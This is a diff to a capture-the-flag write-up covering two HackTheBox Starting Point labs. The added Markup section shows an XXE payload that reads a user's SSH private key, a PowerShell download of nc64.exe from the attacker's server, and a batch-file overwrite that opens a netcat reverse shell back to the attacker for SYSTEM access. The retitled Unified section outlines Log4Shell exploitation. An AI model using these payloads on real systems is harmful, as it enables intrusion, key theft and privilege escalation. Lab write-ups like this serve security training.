@@ -1,18 +1,317 @@
 ---
-title: "Unified — UniFi Network Log4Shell to Root"
-description: "A Ubiquiti UniFi controller vulnerable to Log4Shell: confirm the callback with tcpdump, deliver a reverse shell through rogue-jndi, then flip an admin password hash in UniFi's internal MongoDB to reach the SSH settings and root."
-date: "2026-11-19"
-difficulty: "Hard"
+title: "Starting Point: Tier 3 Walkthrough"
+description: "HackTheBox Starting Point Tier 3 — Markup (Apache XXE to SSH key theft, then Windows privilege escalation through a writable job.bat) and Unified (UniFi Network Log4Shell to root)."
+date: "2026-11-23"
+difficulty: "Easy"
 published: true
 ---
 
-# Unified — UniFi Network Log4Shell to Root
+# Starting Point: Tier 3 Walkthrough
 
-> A Ubiquiti UniFi controller vulnerable to Log4Shell: confirm the callback with tcpdump, deliver a reverse shell through rogue-jndi, then flip an admin password hash in UniFi's internal MongoDB to reach the SSH settings and root.
+> Tier 3 of HackTheBox's Starting Point path. **Markup** is the final lab documented here — an Apache/PHP site with an XXE flaw in its XML order form, leading to Daniel's SSH key and a Windows privilege escalation through a script any user can overwrite. **Unified** is included after it as a second, full machine writeup.
 
 ---
 
-## Machine Information
+## Overview
+
+| Machine | Platform | Core vulnerability | Result |
+|---|---|---|---|
+| **Markup** | Windows Server / XAMPP (Apache 2.4.41, PHP 7.2.28) | XXE in `POST /process.php` | Read `id_rsa` → SSH as Daniel → overwrite `job.bat` → SYSTEM shell |
+| **Unified** | Linux / Ubiquiti UniFi Network 6.4.54 | Log4Shell (CVE-2021-44228) in the login `remember` field | Reverse shell as `unifi` → rewrite admin hash in MongoDB → SSH as root |
+
+Markup is solved by answering the lab's eight guided questions, which walk from fingerprinting the web server all the way to both flags. Unified follows as a full machine writeup.
+
+---
+
+## 1. Markup
+
+### Machine Information
+
+| | |
+|---|---|
+| **Name** | Markup |
+| **Platform** | Hack The Box — Starting Point, Tier 3 (final lab) |
+| **OS** | Windows Server 2019 (`10.0.17763.107`) |
+| **Web stack** | Apache `2.4.41`, PHP `7.2.28`, OpenSSL `1.1.1c` |
+| **Attack vector** | XML External Entity injection in the `Order in Bulk` form |
+
+Wappalyzer identifies the stack before any interaction with the application:
+
+![Wappalyzer showing Apache 2.4.41, PHP 7.2.28, OpenSSL 1.1.1c and Windows Server](/images/writeups/hackthebox/markup-wappalyzer.png)
+
+---
+
+### Task 1 — Apache version
+
+> What version of Apache is running on the target's port 80?
+
+**Answer:** `2.4.41`
+
+The `Server` response header and Wappalyzer both report `Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28`.
+
+---
+
+### Task 2 — Credentials
+
+> What username:password combination logs in successfully?
+
+**Answer:** `admin:password`
+
+The login form at the root of the site accepts the default pair.
+
+![Login form with admin:password](/images/writeups/hackthebox/markup-login.png)
+
+---
+
+### Task 3 — The user-input word
+
+> What is the word at the top of the page that accepts user input?
+
+**Answer:** `order`
+
+The authenticated page is `services.php`; its "Order in Bulk" form posts to `process.php`.
+
+![Order in Bulk form on services.php](/images/writeups/hackthebox/markup-order-form.png)
+
+The same form in a full-page browser view:
+
+![Full-page view of the Order in Bulk form](/images/writeups/hackthebox/markup-order-page.png)
+
+---
+
+### Task 4 — XML version
+
+> What XML version is used on the target?
+
+**Answer:** `1.0`
+
+Inspecting the page reveals the client-side code that builds the request:
+
+```javascript
+var xmlTemplate = '<?xml version="1.0"?><orders>';
+for (var i = 0; i < elements.length; i++) {
+  if (elements[i].tagName == 'INPUT') {
+    xmlTemplate += '<' + elements[i].name + '>' + elements[i].value + '</' + elements[i].name + '>';
+  } else {
+    xmlTemplate += '<' + elements[i].name + '>' + elements[i].value + '</' + elements[i].name + '>';
+  }
+}
+xmlTemplate += '</orders>';
+var http = new XMLHttpRequest();
+var url = 'process.php';
+http.open('POST', url, true);
+http.setRequestHeader('Content-Type', 'text/xml');
+http.send(xmlTemplate);
+```
+
+The application sends a `text/xml` body to `process.php` — and that parser is the way in.
+
+![DevTools showing the XML template built from form fields](/images/writeups/hackthebox/markup-xml-source.png)
+
+---
+
+### Task 5 — The acronym
+
+> What does the XXE / XEE attack acronym stand for?
+
+**Answer:** `XML External Entity`
+
+The parser resolves external entities declared in a `DOCTYPE`, so a `SYSTEM` entity can make the server read a local file and echo it back in the response.
+
+---
+
+### Task 6 — The username in source
+
+> What username can we find on the webpage's HTML code?
+
+**Answer:** `Daniel`
+
+Viewing the source of `services.php` shows a leftover developer comment:
+
+```html
+<!-- Modified by Daniel : UI-FIX-9092 -->
+```
+
+![View-source showing the 'Modified by Daniel' comment](/images/writeups/hackthebox/markup-source-comment.png)
+
+That gives us a Windows username to target with the XXE read.
+
+---
+
+### Task 7 — The file in Log-Management
+
+> What is the file located in the Log-Management folder on the target?
+
+Intercept the `POST /process.php` request in Burp, send it to Repeater, and replace the body with an entity that reads Daniel's private key.
+
+![Baseline XML request to process.php in Burp Repeater](/images/writeups/hackthebox/markup-burp-baseline.png)
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+    <!ENTITY test SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">
+]>
+<order>
+    <quantity>3</quantity>
+    <item>&test;</item>
+    <address>17th Estate, CA</address>
+</order>
+```
+
+![XXE payload returning Daniel's SSH private key](/images/writeups/hackthebox/markup-burp-xxe.png)
+
+**Answer:** `job.bat`
+
+The key is copied into `id_rsa`, given the correct permissions, and used to SSH in as Daniel:
+
+```bash
+vim id_rsa
+chmod 600 id_rsa
+ssh daniel@10.129.62.189 -i id_rsa
+```
+
+```text
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+daniel@MARKUP C:\Users\daniel>cd ..
+daniel@MARKUP C:\>cd Log-Management
+daniel@MARKUP C:\Log-Management>dir
+ Directory of C:\Log-Management
+03/12/2020  02:56 AM    <DIR>          .
+03/12/2020  02:56 AM    <DIR>          ..
+03/06/2020  01:42 AM               346 job.bat
+               1 File(s)            346 bytes
+               2 Dir(s)   7,409,496,064 bytes free
+```
+
+<Callout type="info" title="IP Changed Mid-Lab">
+  The target address changed from `10.129.95.192` to `10.129.62.189` because the lab machine died partway through testing and had to be restarted. The screenshots show both addresses.
+</Callout>
+
+---
+
+### Task 8 — The executable in job.bat
+
+> What executable is mentioned in the file mentioned before?
+
+```text
+daniel@MARKUP C:\Log-Management>type job.bat
+@echo off
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo.
+echo Event Logs have been cleared!
+goto theEnd
+:do_clear
+wevtutil.exe cl %1
+goto :eof
+:noAdmin
+echo You must run this script as an Administrator!
+:theEnd
+exit
+```
+
+**Answer:** `wevtutil.exe`
+
+The batch file clears Windows event logs using `wevtutil.exe`, and it is designed to run as Administrator. That makes it an ideal hijack target — if we can write to it and something privileged executes it, we get a privileged shell.
+
+---
+
+### User Flag
+
+```text
+daniel@MARKUP C:\Users\daniel>cd Desktop
+daniel@MARKUP C:\Users\daniel\Desktop>dir
+ Directory of C:\Users\daniel\Desktop
+03/05/2020  06:18 AM    <DIR>          .
+03/05/2020  06:18 AM    <DIR>          ..
+03/05/2020  06:18 AM                35 user.txt
+               1 File(s)             35 bytes
+daniel@MARKUP C:\Users\daniel\Desktop>type user.txt
+032d2...8ef7
+```
+
+---
+
+### Root Flag
+
+Check who is allowed to modify the script:
+
+```text
+daniel@MARKUP C:\Log-Management>icacls job.bat
+job.bat BUILTIN\Users:(F)
+        NT AUTHORITY\SYSTEM:(I)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Users:(I)(RX)
+Successfully processed 1 files; Failed processing 0 files
+```
+
+`BUILTIN\Users:(F)` — every user has full control. Overwrite `job.bat` with a reverse-shell command and wait for a privileged process to run it.
+
+Download a Windows netcat binary ([nc64.exe](https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe)) to the attack machine and serve it:
+
+```bash
+cd Downloads/
+ls
+# nc64.exe
+python3 -m http.server
+# Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+Grab the VPN address so the payload points back correctly:
+
+```bash
+ifconfig
+# tun0: inet 10.10.15.192  netmask 255.255.254.0
+```
+
+From the Windows host, fetch it with PowerShell:
+
+```text
+daniel@MARKUP C:\Log-Management>powershell
+PS C:\Log-Management> wget http://10.10.15.192:8000/nc64.exe -outfile nc64.exe
+PS C:\Log-Management> dir
+    Directory: C:\Log-Management
+-a----         3/6/2020   1:42 AM            346 job.bat
+-a----       11/23/2026   4:54 AM          45272 nc64.exe
+```
+
+The Python server confirms the transfer:
+
+```text
+10.129.62.189 - - [23/Nov/2026 07:54:13] "GET /nc64.exe HTTP/1.1" 200 -
+```
+
+Start a listener, then overwrite the batch file:
+
+```bash
+nc -lnvp 4444
+```
+
+```text
+daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.192 4444 > C:\Log-Management\job.bat
+```
+
+The elevated scheduled execution of `job.bat` returns a shell as Administrator:
+
+```text
+Listening on 0.0.0.0 4444
+Connection received on 10.129.62.189 49675
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+C:\Users\Administrator\Desktop>type root.txt
+f574…70f8
+```
+
+---
+
+## 2. Unified
+
+### Machine Information
 
 | | |
 |---|---|
@@ -27,7 +326,7 @@ The box lives up to its name: everything needed to root it is inside one UniFi c
 
 ---
 
-## Attack Path
+### Attack Path
 
 1. Enumerate ports and identify UniFi Network 6.4.54 on `8443/tcp`.
 2. Inject a Log4Shell probe into the `remember` field of `POST /api/login` and watch for an LDAP callback.
@@ -38,7 +337,7 @@ The box lives up to its name: everything needed to root it is inside one UniFi c
 
 ---
 
-## 1. Recon
+### Recon
 
 A full TCP scan with default scripts and version detection:
 
@@ -85,7 +384,7 @@ A quick password attempt is rejected, which is expected — this box is about in
 
 ---
 
-## 2. The automated PoC fails
+### The automated PoC fails
 
 The well-known `log4j-shell-poc` script is the obvious first try:
 
@@ -116,7 +415,7 @@ The exploit script hardcodes a bundled JDK that is not present in this download.
 
 ---
 
-## 3. Confirming Log4Shell with an LDAP callback
+### Confirming Log4Shell with an LDAP callback
 
 Proxy the browser through Burp and send a login attempt. The interesting parameter is `"remember": false` in the JSON body of `POST /api/login`.
 
@@ -164,7 +463,7 @@ The target initiated a TCP connection back to port 389. Log4Shell is confirmed a
 
 ---
 
-## 4. Serving the payload with rogue-jndi
+### Serving the payload with rogue-jndi
 
 Java and Maven are already available:
 
@@ -250,7 +549,7 @@ We have a shell as the `unifi` service account.
 
 ---
 
-## 5. User flag
+### User flag
 
 The UniFi controller runs its own MongoDB, bound to localhost:
 
@@ -271,7 +570,7 @@ unifi@unified:/home/michael$ cat user.txt
 
 ---
 
-## 6. Privilege escalation — rewriting the admin hash
+### Privilege escalation — rewriting the admin hash
 
 Query the `admin` collection in the `ace` database:
 
@@ -312,7 +611,7 @@ WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
 
 ---
 
-## 7. Root
+### Root
 
 Log in to the UniFi web interface with `administrator` / `Password1234`, then navigate to **Settings → Site** and scroll to the **SSH Authentication** section. The controller stores the root password in clear text there:
 
@@ -332,7 +631,18 @@ Box pwned.
 
 ---
 
+---
+
 ## Lessons Learned
+
+### Markup
+
+- **The guided questions are a breadcrumb trail, not busywork.** Each answer (Apache version, `admin:password`, `order`, XML 1.0, `Daniel`, `job.bat`, `wevtutil.exe`) feeds the next step. The "Modified by Daniel" source comment is what turns a generic XXE into a targeted read of `C:\Users\daniel\.ssh\id_rsa`.
+- **XXE is a file-read primitive, not just a parser bug.** The `POST /process.php` endpoint accepted a `DOCTYPE` declaration and happily expanded `SYSTEM "file:///..."` — handing over the private key needed for the next stage.
+- **Always run `icacls` on interesting Windows scripts.** `BUILTIN\Users:(F)` on `job.bat` meant any user could replace a script that runs with elevated privileges. That single ACL is the whole privilege escalation.
+- **A service account's tooling becomes your payload delivery.** Python's `http.server` plus PowerShell's `wget` moved `nc64.exe` onto the target without needing any exploit-specific upload primitive.
+
+### Unified
 
 - **Log4Shell does not need a working exploit script.** The `log4j-shell-poc` tooling failed because of a missing bundled JDK, but the vulnerability itself was reachable with nothing more than Burp, a modified JSON field, and `tcpdump`.
 - **Trust the out-of-band signal, not the HTTP status.** The login endpoint returned `400` every time; the JNDI injection was proven by the LDAP SYN arriving on `tun0`.
